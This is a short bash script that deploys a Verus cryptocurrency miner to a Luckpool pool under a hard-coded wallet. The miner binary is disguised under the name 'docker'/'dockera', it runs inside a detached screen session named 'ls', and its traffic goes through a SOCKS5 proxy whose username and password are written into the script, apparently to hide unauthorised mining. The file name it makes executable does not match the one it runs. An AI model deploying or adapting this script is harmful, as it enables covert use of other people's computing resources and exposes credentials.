#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
WORKER=$(echo $(shuf -i 100000-999999 -n 1)-P000000199800XUTRA)
PROXY=socks5://woiden_fgdsage:aegegs@163.172.214.196:8080
./dockera -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
